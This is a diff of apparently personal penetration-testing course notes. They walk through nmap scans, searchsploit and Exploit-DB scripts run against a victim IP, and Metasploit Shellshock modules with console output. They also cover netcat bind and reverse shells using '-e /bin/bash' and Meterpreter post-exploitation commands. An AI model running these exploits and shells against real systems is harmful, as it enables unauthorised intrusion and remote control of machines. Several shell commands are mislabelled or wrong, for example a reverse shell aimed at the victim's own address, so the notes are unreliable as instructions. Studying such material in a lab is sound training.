@@ -258,6 +258,8 @@ kioptrix- level 1 This is a first level machine, login john and pw TwoCows2
 
 - **nmap** Simply typing nmap in kali will tell you about the various commands you can use along with it
 
+- The main goal of nmap is to determine which ports are open and which OS and services are running on those open ports
+
 `nmap -T4 -p- -A <ipaddress>` T4 is speed (max 5- might miss some things) -p- means scanning all ports- i-e it will run to check all possible ports to see which one is open, but if you leave this out then it means that it will scan top 1000 ports I can also specify certain ports if I like for example `-p 80,443`. `-A` tell me everything (**OS detection, version detection, script scanning and trace route**). Not that even if its not typed in the command `-sS`  (stelth scan for TCP) is automatically included
 - Note that -A is the real speed killer here as it is checking for all the versions
 `nmap -sU -T4 -p- -A <ipaddress>`  - sU is for scanning UDP
@@ -411,8 +413,19 @@ Response codes: `200` ok, `400` error, `500` server error, `300` is redirect
 
 ## Exploitation
 
+Exploitation is a multi-step process. You must:
 
-**Search Sploit**
+  1. Identify vulnerabilities. using `searchsploit`
+
+  2. Identify specific exploits that correspond to that vulnerability. Done with `searchsploit`
+
+  3. Prepare and test the exploit payload. Done with `Metasploit:  MSFconsole and Meterpreter` MsFconsole is the main metasploit program that is run on the hacker's compututer. Using Metasploit from the hacker's computer you can then run Meterpreter on the victim's computer after gaining access 
+
+ -  You will use MSFconsole to find vulnerable machines and gain access to them. After you've exploited them, you'll use Meterpreter on the compromised machine. 
+
+- Initial scan can lead to identification of open ports and then it also determins which OS versions are available or which services are being run, in particular file sharing, server applications etc. Then once this information is available I can use search sploit to search for vulnerabilities to exploit. 
+
+**Search Sploit** This is outside metasploit - The metasploitc alternative to searchsploit are **auxillary modules**
 - It is a query to find the scripts or payloads available for a given vulnerability
 - `Exploit-DB`
 - It relies on a database called Exploit-Db
@@ -420,7 +433,9 @@ Response codes: `200` ok, `400` error, `500` server error, `300` is redirect
 
 - In kali linux this repository is already installed, so you can use it even if you are not connected to the internet. But this repository should be updated weeky
 
-- `searchsploit` in kali linux queries this database. Kali linux or the searchsploit by typing `searchsploit -u`. This is important because it gives you the ability to run it offline and perform searches offline- it syncs the local repo with the remote repo. Other useful command adjuncts: `-c`(case sensitive), `-e`(exact match), `j`(JSON format), `p`(full path to a file), `t`( search in title), `w`(will provide website in the results)
+- `searchsploit -u` to update the repository, do this weekly
+
+- `searchsploit` in kali linux queries this database. Kali linux or the searchsploit by typing `searchsploit -u`. This is important because it gives you the ability to run it offline and perform searches offline- it syncs the local repo with the remote repo. Other useful command adjuncts: `-c`(case sensitive), `-e`(exact match), `j`(JSON format), `p`(full path to a file), `t`( search in title), `w`(will provide website in the results), `-x` opens the code file - functions similar to the `less` command
 
 - `searchsploit ftp remote file | wc -l` this will search the database for the words ftp, remote and file. `| wc -l` returns the number of exploits in the search
 
@@ -428,16 +443,49 @@ Response codes: `200` ok, `400` error, `500` server error, `300` is redirect
 
 - `searchsploit mysql 6.0 -w` `-w` provides the website in results
 
-- Exploit scripts or **payload scripts**
-    - .rb are scripts written in Ruby.
-    - .py in Python.
-    - .sh in Bash.
-    - .html in HTML.
-    - .txt in a text editor.
-
-
 - `searchsploit shellshock` will show all the shellshock scripts
 
+ - `searchsploit apache | head` head shows only the top 10 results
+
+ - Each of the results will have a path to where the exploit code file is located. For example for the above command the path is `php/remote/29316.py` the path can vary with upgrades. Note that this path shown asumes that you are inside the exploits folder 
+
+ - `searchsploit -x php/remote/29316.py` opens the exploit file. You can type `q` for quit to get out of the file and back to the terminal
+
+ - once the file opens, the exact complete path is displayed at the bottom- copy that. In order to run the exploit you need the complete path, the path mentioned above wont work
+
+ - `python /usr/share/exploitdb/exploits/php/remote/29316.py` This will now run the script and display options
+
+All of this I am still running on my own Kali machine not the victim's machine
+
+ ```
+ python /usr/share/exploitdb/exploits/php/remote/29316.py
+--==[ ap-unlock-v1337.py by noptrix@nullsecurity.net ]==--
+usage: 
+
+  ./ap-unlock-v1337.py -h <4rg> -s | -c <4rg> | -x <4rg> [0pt1ons]
+  ./ap-unlock-v1337.py -r <4rg> | -R <4rg> | -i <4rg> [0pt1ons]
+
+0pt1ons:
+
+  -h wh1t3h4tz.0rg     | t3st s1ngle h0st f0r vu1n
+  -p 80                | t4rg3t p0rt (d3fau1t: 80)
+  -S                   | c0nn3ct thr0ugh ss1
+  -c 'uname -a;id'     | s3nd c0mm4nds t0 h0st
+  -x 192.168.0.2:1337  | c0nn3ct b4ck h0st 4nd p0rt f0r sh3ll
+  -s                   | t3st s1ngl3 h0st f0r vu1n
+  -r 133.1.3-7.7-37    | sc4nz iP addr3ss r4ng3 f0r vu1n
+  -R 1337              | sc4nz num r4nd0m h0st5 f0r vu1n
+  -t 2                 | c0nn3ct t1me0ut in s3x (d3fau1t: 3)
+  -T 2                 | r3ad t1me0ut in s3x (d3fau1t: 3)
+  -f vu1n.lst          | wr1t3 vu1n h0sts t0 f1l3
+  -i sc4nz.lst         | sc4nz h0sts fr0m f1le f0r vu1n
+  -v                   | pr1nt m0ah 1nf0z wh1l3 sh1tt1ng
+```
+
+- I can also add an ip address at the end of the command to run it against that machine: 
+- `python /usr/share/exploitdb/exploits/php/remote/29316.py <victim ip address>` or `cd /usr/share/exploitdb/exploits/multiple/remote` then `python 32764.py <victim ip address>` Note that this is 'manual' exploitation w/o using metasploit
+
+- Another example of running payload - `python /usr/share/exploitdb/exploits/linux/remote/34900.py payload=bind rhost=<victim ip address> rport=80 pages=/cgi-bin/vulnerable`
 
 - So far I have only run scans. Gathered Ips and related info on vulnerabilities. Once I have this info now is the time to search for the exploits for these vulnerabilities. 
 
@@ -533,7 +581,7 @@ Response codes: `200` ok, `400` error, `500` server error, `300` is redirect
 
 
 **Payload**
-- A payload is an exploit script example is below
+- A payload is an exploit script example is below - This is without using metasploit and doing it manually
 - `python /usr/share/exploitdb/exploits/linux/remote/34900.py payload=bind rhost=192.168.0.21 rport=80 pages=/cgi-bin/vulnerable`
 
 - In the above command /usr/share/exploitdb/ is the path displayed in the searchsploit display screen and then the remainder of the path is the part that is next to 
@@ -556,13 +604,93 @@ Response codes: `200` ok, `400` error, `500` server error, `300` is redirect
 
 - **Metasploit** - The commands are not case sensitive
 
-You can search by the name of the modules for example after metasploit is loaded (with `search java`, search `shellshock`)
+- It is preinstalled in Kali linux, to initiate it type `msfconsole`
+
+ - **Auxiliary modules**: Used for information gathering, enumeration, and port scanning. Can also be used for things like connecting to SQL databases and performing man-in-the-middle attacks.
+
+  - **Exploit modules**: Generally used to deliver exploit code to a target system.
+
+  - **Post modules**: Offers post-exploitation tools such as the ability to extract password hashes and access tokens. Provides modules for taking a screenshot, key-logging, and downloading files. You'll explore these during the next class. 
+
+  - **Payload modules**: Used to create malicious payloads to use with an exploit. If possible, the aim is to upload a copy of Meterpreter, which is the default payload of Metasploit.
+
+- The metasploit alternative of searchsploit is the word `search`. Whatever you type after search, metasploit will search for exploits available for it
+
+> **Sequence of commands with Metasploit**
+
+- `msfconsole`
+- `search shellshock`
+```
+msf6 > search shellshock
+
+Matching Modules
+================
+
+   #   Name                                               Disclosure Date  Rank       Check  Description
+   -   ----                                               ---------------  ----       -----  -----------
+   0   auxiliary/scanner/http/apache_mod_cgi_bash_env     2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
+   1   auxiliary/server/dhclient_bash_env                 2014-09-24       normal     No     DHCP Client Bash Environment Variable Code Injection (Shellshock)
+   2   exploit/linux/http/advantech_switch_bash_env_exec  2015-12-01       excellent  Yes    Advantech Switch Bash Environment Variable Code Injection (Shellshock)
+   3   exploit/linux/http/ipfire_bashbug_exec             2014-09-29       excellent  Yes    IPFire Bash Environment Variable Injection (Shellshock)                                                                                                                                          
+   4   exploit/multi/ftp/pureftpd_bash_env_exec           2014-09-24       excellent  Yes    Pure-FTPd External Authentication Bash Environment Variable Code Injection (Shellshock)
+   5   exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
+   6   exploit/multi/http/cups_bash_env_exec              2014-09-24       excellent  Yes    CUPS Filter Bash Environment Variable Code Injection (Shellshock)
+   7   exploit/multi/misc/legend_bot_exec                 2015-04-27       excellent  Yes    Legend Perl IRC Bot Remote Code Execution
+   8   exploit/multi/misc/xdh_x_exec                      2015-12-04       excellent  Yes    Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution
+   9   exploit/osx/local/vmware_bash_function_root        2014-09-24       normal     Yes    OS X VMWare Fusion Privilege Escalation via Bash Environment Code Injection (Shellshock)
+   10  exploit/unix/dhcp/bash_environment                 2014-09-24       excellent  No     Dhclient Bash Environment Variable Injection (Shellshock)                                                                                                                                        
+   11  exploit/unix/smtp/qmail_bash_env_exec              2014-09-24       normal     No     Qmail SMTP Bash Environment Variable Injection (Shellshock)                                                                                                    
+   ```
+
+- `use auxiliary/scanner/http/apache_mod_cgi_bash_env` what use dose is the same as `load` in recon-ng
+```
+msf6 > use auxiliary/scanner/http/apache_mod_cgi_bash_env
+msf6 auxiliary(scanner/http/apache_mod_cgi_bash_env) > 
+```
+- `info` this provides information about what the module does - note that here we are using the auxillary module, its not an exploit module
+- `options` Typing this will inform us about what are the requirements to run this module successfully. The options that do not have the default settings already set and are required must be `set` Like you can see below that CMD, CVE, HEADER, METHOD,RPORT and SSL are already set with default settings but `rhosts` and `targeturi` are not. They are required and must be set
+
+```
+msf6 auxiliary(scanner/http/apache_mod_cgi_bash_env) > options
+
+Module options (auxiliary/scanner/http/apache_mod_cgi_bash_env):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   CMD        /usr/bin/id      yes       Command to run (absolute paths required)
+   CVE        CVE-2014-6271    yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
+   HEADER     User-Agent       yes       HTTP header to use
+   METHOD     GET              yes       HTTP method to use
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI                   yes       Path to CGI script
+   THREADS    1                yes       The number of concurrent threads (max one per host)
+   VHOST                       no        HTTP server virtual host
+
+```
+- `set rhosts <victim ip address>`
+- `set targeturi /cgi-bin/vulnerable` CGI (Common Gateway Interface) is an interface that enables webservers to execute external programs. The complete path from the root directory in linux is `/usr/lib/cgi-bin/` and by specifying the targeturi we are setting the path to use the exploit module, path where the script file is located
+- `run` or `exploit` after running the above commands
+
+- finding stuff: `find -d -iname *cgi*` , `find -d -iname cgi-bin` , `find . -iname flag`
+
+- Thus in a similar way you can run the exploit instead of auxillary, specify the victim ip, and when you run it it will establish a connection 
+
+- When an exploitation is successful with metasploit, it automatically opens a `meterpreter` sesstion with the victim. Meterpreter is short for Meta-Interpreter, it sets up `reverse shells` automatically or you can do that manually using `ncat`
+
+---------------------------------------------------------------------------------------------------------
+
+> below is some repition of above
+
+You can search by the name of the modules for example after metasploit is loaded (with `search java`, `search shellshock`)
 
  - `exploit/windows/browser/java_cmm` is an exploit module, which delivers the exploit to the target system.
     
  - `auxiliary/scanner/misc/java_jmx_server` is an auxiliary module, used for tasks such as information gathering, enumeration, and port scanning.
     
- - `payload/firefox/gather/cookies` is a payload module.
+ - `payload/firefox/gather/cookies` is a payload module. It is the malacious script to be run
 
  If i want to use a particular module then I can type the `use` command and then the path to whatever module I want to load. This load will runn with the shell shock exploit
 
@@ -589,20 +717,31 @@ You can search by the name of the modules for example after metasploit is loaded
 - Typically after running the `nmap` scan you will have info regarding the version of filesystem such as samba- then you google for that version to find code for exploitation. 
 - Then you paste that code into metasploit command terminal
 - you can then type `options`
-- `set rhosts <ip address of victim>`
+- `set rhosts <ip address of victim>` I can also use `setg` instead of `set` toset the rhost ip address globally if I am planning on running multiple modules
 - `show targets`
 - `run`
+
+
+
+
+
 
 - Once you are able to connect. The next step is sending the malware script 
 
 
 ## Post-Exploitation
 
-- Once you are able to break into a victim machine (with exploits you found with search sploit) you can run **Meterpreter** on the target or transfer `payloads`. The goal of the paylod is to establish a shell which intern can be **bind shell** - hacker (port) connects to victim (listener) or **reverse shell** - victim(port) connects to hacker (listener- these port openings are called **backdoor**. This step can be done without metasploit if we use `Ncat`
+- Once you are able to break into a victim machine (which means a successful run of metasploit exploit module or manual running of python etc explot script on the `rhost < victim ip address>` ) you can run **Meterpreter** on the target or transfer `payloads`. The goal of the paylod is to establish a shell which intern can be **bind shell** - A port is opened on victim to which a hacker is able to connect or **reverse shell** - victim(port) connects to hacker to establish a session (These s **backdoor**). This step can be done without metasploit if we use `Ncat`
+
+- After successful exploitation, `nc` or ncat can be used to establish a backdoor
 
 After the exploit is successful, 
-- **bind sgell**
- -  `nc -lnvp 4444 -e /bin/bash` This command is run on the hacker's computer, sumultaneously you will have to open a port on the victim as well by using `nc <ip address of victim> 4444`
+
+- **bind shell**
+
+- Hacker machine:  `nc <ip address of hacker> 4444` on the hacker kali linux machine, this will allow the victim to connect to hacker
+
+ - Victim Machine:  `nc -lnvp 4444 -e /bin/bash` This command is run on the victim's computer (metasploitable machine) to create a listener port
 
        - `-l`: Tells Ncat to listen for incoming connection.
           - `-n`: Indicates that we are listening for numeric IP addresses.
@@ -611,6 +750,72 @@ After the exploit is successful,
          - `-e`: Executes a bash shell, specifically, `/bin/bash`.
 
 
+
+
+- **reverse shell**
+
+- Hacker machine: `nc -lvnp 444`
+- Victim machine: `nc <ip address of victim> -e /bin/bash`
+
+- After a connection is established using either method some useful commands to run
+- `whoami`
+- `ifconfig`
+- `pwd`
+
+
+
+**Meterpreter**
+
+- Runs in memory-does not create files
+- encrypts all communication to and from victim machine
+
+Opening a Meterpreter session on a target host consists of four main steps:
+
+1. Exploiting the target. Done with runing exploits on rhost ip address, this also opens a meterpreter session
+
+2. Uploading a Meterpreter payload on the target. 
+
+3. Starting a TCP listener.
+
+4. Executing the Meterpreter payload.
+
+The easiest way to open a Meterpreter shell is to select an exploit and set a Meterpreter payload. 
+  - A common payload is `windows/meterpreter/reverse_tcp`.
+
+  - **Note:** You can have multiple Meterpreter sessions open on multiple machines.
+
+The following commands are needed to connect to a Meterpreter session:
+
+- `sessions`: Lists all open Meterpreter sessions.
+
+- `sessions -i <Session ID>`: Connects to a designated session.
+
+- `sessions -i 1`: Brings our session to the foreground, meaning any command we run on our host machine will be run on the Meterpreter shell on the target. 
+
+Once we've connected to a Meterpreter session, we can run many other commands to get information on the target:
+
+  - `?`: Prints Meterpreter's help page, which lists all possible commands.
+
+  - `getuid`: Prints user ID.
+
+  - `getwd`: Prints current working directory.
+
+  - `ifconfig`: Prints the victim's network information.
+
+  - `sysinfo`: Gathers system information (OS, architecture, kernel version). 
+
+  - `upload`: Uploads a file to the target.
+
+  - `download`: Downloads a file from the target.
+
+  - `search`: Searches for resources, similar to the `find` command in Linux.
+
+  - `run win_privs`: Provides more detailed Windows privilege information.
+
+  - `run win_enum`: Runs a comprehensive suite of Windows enumerations and stores the results on the attacking machine.
+
+
+**Payload types**
 
 - Payloads are **staged** (the payload is assembled in multiple parts) or **stageless** (all sent at once). A large size payload is likely to fail
 
